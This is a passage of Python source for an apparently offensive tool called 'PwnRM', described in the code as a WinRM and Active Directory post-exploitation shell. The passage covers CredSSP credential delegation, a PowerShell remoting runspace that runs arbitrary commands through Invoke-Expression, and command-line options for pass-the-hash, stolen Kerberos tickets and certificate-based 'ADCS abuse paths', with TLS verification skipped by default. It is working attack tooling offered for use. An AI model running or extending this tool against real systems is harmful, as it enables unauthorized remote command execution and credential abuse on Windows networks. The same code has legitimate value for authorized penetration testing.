        tsreq                 = TSRequest()
        tsreq["version"]      = 6
        tsreq["authInfo"]     = proxy.wrap(encoder.encode(tscred), joined=True)
        _send_credssp(tsreq, "credential delegation")

    def _wrap(self, data):
        self.tls_obj.write(data)
        enc             = self.tls_out.read()
        cipher, proto, _ = self.tls_obj.cipher()
        tl              = tls_trailer_length(len(enc), proto, cipher)
        return enc[:tl], enc[tl:]

    def _unwrap(self, sig, data):
        self.tls_in.write(sig + data)
        parts = []
        while True:
            try:    parts.append(self.tls_obj.read())
            except ssl.SSLWantReadError: break
        return b"".join(parts)


# ── Runspace (MS-PSRP) ────────────────────────────────────────────────────────
class Runspace:
    def __init__(self, transport, timeout=30):
        self.transport      = transport
        self.timeout        = timeout
        self.fragment_buffer= {}
        self.next_object_id = 1
        self.session_id     = str(uuid.uuid4()).upper()
        self.runspace_id    = str(uuid.uuid4()).upper()
        self.pipeline_id    = str(uuid.uuid4()).upper()
        self.shell_id       = None
        self.command_id     = None

    def __enter__(self):
        req     = soap_req("create", self.session_id, timeout=10)
        options = req.find("s:Header").find("wsman:OptionSet")
        ET.SubElement(options, "wsman:Option",
                      {"Name":"protocolversion","MustComply":"true"}).text = "2.1"
        shell = ET.SubElement(req.find("s:Body"), "rsp:Shell")
        ET.SubElement(shell, "rsp:ShellId").text    = "http://localhost/wsman"
        ET.SubElement(shell, "rsp:InputStreams").text = "stdin"
        ET.SubElement(shell, "rsp:OutputStreams").text= "stdout"
        ET.SubElement(shell, "creationXml").text = b64str(self._fragment([
            (SESSION_CAPABILITY, ps_capability),
            (INIT_RUNSPACEPOOL,  ps_runspace_pool),
        ]))
        rsp = self._post(req)
        if "fault" in rsp:
            raise RuntimeError(rsp["reason"])
        self.shell_id = rsp.get("shell_id")
        self._receive(); self._receive()
        return self

    def __exit__(self, *_):
        try:
            req = soap_req("delete", self.session_id, self.shell_id, self.timeout)
            self._post(req)
        except Exception:
            pass

    def run_command(self, cmd):
        self.command_id = self._create_pipeline(cmd)
        if not self.command_id:
            yield {"error": "Pipeline creation failed — restart the shell if this persists"}
            return
        timeouts = 0
        while True:
            rsp = self._receive(self.command_id)
            if "fault" in rsp:
                if rsp["subcode"] == "w:TimedOut":
                    timeouts += 1
                    yield {"timeout": timeouts}
                    continue
                yield {"error": rsp["reason"] + "\n" + rsp["detail"]}
                return
            timeouts = 0
            for msg_type, msg in self._defragment(rsp["streams"]):
                if msg_type == PIPELINE_OUTPUT:
                    if msg.tag == "S":
                        yield {"stdout": utfstr(msg.text) or ""}
                elif msg_type == ERROR_RECORD:
                    yield {"error": xml_get_text(msg, ".//ToString", "unknown error")}
                elif msg_type == WARNING_RECORD:
                    yield {"warn": xml_get_text(msg, ".//ToString", "unknown warning")}
                elif msg_type == VERBOSE_RECORD:
                    yield {"verbose": xml_get_text(msg, ".//ToString", "")}
                elif msg_type == INFORMATION_RECORD:
                    info  = xml_get_text(msg, ".//Props/S[@N='Message']", "")
                    endl  = xml_get_text(msg, ".//Props/B[@N='NoNewLine']", "false") == "false"
                    yield {"info": info, "endl": "\n" if endl else ""}
                elif msg_type == PIPELINE_STATE:
                    state = int(xml_get_text(msg, ".//I32[@N='PipelineState']"))
                    if state in (3, 5, 6):
                        yield {"error": xml_get_text(msg, ".//ToString", "")}
                elif msg_type == PROGRESS_RECORD:
                    status   = xml_get_text(msg, ".//S[@N='StatusDescription']", "")
                    activity = xml_get_text(msg, ".//S[@N='Activity']", "")
                    yield {"progress": status or activity}
            if rsp["state"].endswith("CommandState/Done"):
                break
        self.command_id = None

    def interrupt(self):
        if self.command_id:
            req = soap_req("signal", self.session_id, self.shell_id, self.timeout)
            sig = ET.SubElement(req.find("s:Body"), "rsp:Signal",
                                {"CommandId": self.command_id})
            ET.SubElement(sig, "rsp:Code").text = "powershell/signal/crtl_c"
            return self._post(req)

    def _post(self, req):
        rsp    = ET.fromstring(self.transport.send(ET.tostring(req, encoding="utf8")))
        action = rsp.find("./s:Header/wsa:Action", soap_ns).text
        if action.endswith("wsman/fault"):
            return {
                "fault":   "ok",
                "subcode": xml_get_text(rsp, ".//s:Subcode/s:Value", ""),
                "reason":  xml_get_text(rsp, ".//s:Reason/s:Text", ""),
                "detail":  xml_get_text(rsp, ".//s:Detail/s:Message", ""),
            }
        elif action.endswith("shell/ReceiveResponse"):
            return {
                "receive": "ok",
                "streams": [b64decode(s.text) for s in rsp.findall(".//rsp:Stream", soap_ns)],
                "state":   xml_get_attrib(rsp, ".//rsp:CommandState", "State", ""),
            }
        elif action.endswith("transfer/CreateResponse"):
            return {"create":"ok", "shell_id": xml_get_text(rsp,".//rsp:Shell/rsp:ShellId","")}
        elif action.endswith("shell/CommandResponse"):
            return {"command":"ok","command_id": xml_get_text(rsp,".//rsp:CommandId","")}
        elif action.endswith("shell/SignalResponse"):
            return {"signal":"ok"}
        elif action.endswith("transfer/DeleteResponse"):
            return {"delete":"ok"}
        else:
            logging.debug(ET.tostring(rsp))
            raise NotImplementedError(action)

    def _receive(self, command_id=None):
        req = soap_req("receive", self.session_id, self.shell_id, self.timeout)
        options = req.find("s:Header").find("wsman:OptionSet")
        ET.SubElement(options, "wsman:Option",
                      {"Name":"WSMAN_CMDSHELL_OPTION_KEEPALIVE"}).text = "true"
        recv = ET.SubElement(req.find("s:Body"), "rsp:Receive")
        attr = {"CommandId": command_id} if command_id else {}
        ET.SubElement(recv, "rsp:DesiredStream", attr).text = "stdout"
        return self._post(req)

    def _create_pipeline(self, cmd, is_script=False):
        pipeline = ps_create_pipeline([
            ps_command("Invoke-Expression", {"Command": cmd}),
            ps_command("Out-String",        {"Stream":  None}),
        ])
        req     = soap_req("command", self.session_id, self.shell_id, self.timeout)
        cmdline = ET.SubElement(req.find("s:Body"), "rsp:CommandLine")
        ET.SubElement(cmdline, "rsp:Command")
        ET.SubElement(cmdline, "rsp:Arguments").text = b64str(
            self._fragment([(CREATE_PIPELINE, pipeline)])
        )
        rsp = self._post(req)
        return rsp.get("command_id")

    # ── MS-PSRP fragmentation ─────────────────────────────────────────────────
    def _fragment(self, messages):
        out = b""
        for msg_type, ps_obj in messages:
            obj_id = self.next_object_id
            self.next_object_id += 1
            xml    = ET.tostring(ps_obj, encoding="unicode").encode("utf-8")
            data   = (pack("<QQI", obj_id, 1, msg_type) +
                      self.runspace_id.replace("-","").encode() +
                      self.pipeline_id.replace("-","").encode() +
                      xml)
            # Single fragment (start=1, end=1)
            out += pack(">BQI", 0b11, 0, len(data)) + data
        return out

    def _defragment(self, streams):
        for data in streams:
            if len(data) < 21: continue
            flags, frag_id, length = unpack(">BQI", data[:13])
            payload  = data[13:]
            obj_id, runspace_id_raw, msg_type = unpack("<QQI", payload[:20])
            xml_data = payload[20 + 32:]   # skip two UUID fields
            buf = self.fragment_buffer
            buf.setdefault(obj_id, b"")
            buf[obj_id] += xml_data
            if flags & 0b01:   # end flag
                try:
                    msg = ET.fromstring(buf.pop(obj_id).decode("utf-8","replace"))
                    yield msg_type, msg
                except ET.ParseError as e:
                    logging.debug(f"XML parse error in fragment: {e}")


# ── argument_parser / create_transport (public API) ───────────────────────────
def argument_parser():
    parser = ArgumentParser(
        prog="pwnrm",
        description="PwnRM v1.0.0 — Advanced WinRM / AD post-exploitation shell",
        epilog="Example: pwnrm -u Administrator -p 'P@ss1' 192.168.1.10\n"
               "         pwnrm -u user@DOMAIN -k --ccache /tmp/user.ccache dc01.domain.local\n"
               "         pwnrm -u user@DOMAIN --pfx user.pfx --pfx-pass secret https://dc01:5986",
    )
    parser.add_argument("target",
        help="[[domain/]username[:password]@]<host> or plain <host>")
    # Auth
    auth = parser.add_argument_group("Authentication")
    auth.add_argument("-u","--username", default="", help="Username (overrides target string)")
    auth.add_argument("-p","--password", default="", help="Password")
    auth.add_argument("-d","--domain",   default="", help="Domain / workgroup")
    auth.add_argument("-H","--hash",     metavar="NTHASH",
                      help="NT hash for Pass-the-Hash (format: [LM:]NT  or  :NT)")
    auth.add_argument("-k","--kerberos", action="store_true",
                      help="Use Kerberos transport (requires valid ccache or KRB5CCNAME)")
    auth.add_argument("--ccache",        metavar="FILE",
                      help="Path to .ccache file (default: $KRB5CCNAME)")
    auth.add_argument("--pfx",           metavar="FILE",
                      help="Client certificate (.pfx) for HTTPS mutual-auth")
    auth.add_argument("--pfx-pass",      metavar="PASS", default="",
                      help="Passphrase for --pfx")
    auth.add_argument("--credssp",       action="store_true",
                      help="Force CredSSP transport (delegates credentials)")
    # Connection
    conn = parser.add_argument_group("Connection")
    conn.add_argument("--port",    type=int, default=0,
                      help="Override WinRM port (default: 5985 HTTP / 5986 HTTPS)")
    conn.add_argument("--ssl",     action="store_true",
                      help="Force HTTPS even on non-standard port")
    conn.add_argument("--no-ssl-verify", action="store_true",
                      help="Skip TLS certificate verification (default: already skipped)")
    conn.add_argument("--timeout", default="30",
                      help="Per-request timeout in seconds (default: 30)")
    # Execution
    parser.add_argument("-X", metavar="CMD",
                        help="Execute single command and exit (non-interactive)")
    # Misc
    parser.add_argument("--ts",    action="store_true", help="Add timestamps to log output")
    parser.add_argument("--debug", action="store_true", help="Verbose / debug output")
    return parser


def create_transport(args) -> Transport:
    """
    Resolves credentials and returns the appropriate Transport instance.

    Priority:
      1. --pfx            → ClientCertTransport   (ADCS cert-based auth)
      2. --kerberos / -k  → KerberosTransport     (ccache or KRB5CCNAME)
      3. --credssp        → CredSSPTransport       (full cred delegation)
      4. default          → SPNEGOTransport        (NTLM or Kerberos via SPNEGO)
    """
    # ── parse target string ───────────────────────────────────────────────────
    domain, username, password, host = parse_target(args.target)
    if args.domain:   domain   = args.domain
    if args.username: username = args.username
    if args.password: password = args.password

    # ── build URL ─────────────────────────────────────────────────────────────
    use_ssl = args.ssl or (args.port == 5986) or \
              (urlparse(args.target).scheme == "https")
    port    = args.port or (5986 if use_ssl else 5985)
    scheme  = "https" if use_ssl else "http"
    url     = f"{scheme}://{host}:{port}/wsman"

    # ── 1. Client certificate (.pfx) — maps to ADCS abuse paths ─────────────
    if getattr(args, "pfx", None):
        cert_pem, key_pem = load_pfx(args.pfx, getattr(args,"pfx_pass","") or None)
        logging.info(f"[+] Using client-cert transport ({args.pfx})")
        return ClientCertTransport(url, cert_pem, key_pem)

    # ── 2. Kerberos (ccache) ──────────────────────────────────────────────────
    if getattr(args, "kerberos", False):
        dom, user, ticket, tgskey = load_kerberos_ccache(getattr(args,"ccache",None))
        domain   = domain   or dom
        username = username or user
        logging.info(f"[+] Kerberos transport as {domain}\\{username}")
        creds = KrbCredential(domain, username, ticket, tgskey, password=password)
        return KerberosTransport(url, creds)

    # ── 3. CredSSP ────────────────────────────────────────────────────────────
    if getattr(args, "credssp", False):
        nt_hash = ""
        if getattr(args,"hash",""):
            nt_hash = args.hash.split(":")[-1]
        creds = NTCredential(domain, username, password, nt_hash)
        logging.info(f"[+] CredSSP transport as {domain}\\{username}")
        return CredSSPTransport(url, creds)

    # ── 4. Default: SPNEGO (NTLM or Kerberos-within-SPNEGO) ──────────────────
    nt_hash = ""
    if getattr(args,"hash",""):
        nt_hash = args.hash.split(":")[-1]
    creds = NTCredential(domain, username, password, nt_hash)
    logging.info(f"[+] SPNEGO transport as {domain}\\{username} "
                 f"({'NTLM' if not nt_hash else 'PtH'})")
    return SPNEGOTransport(url, creds)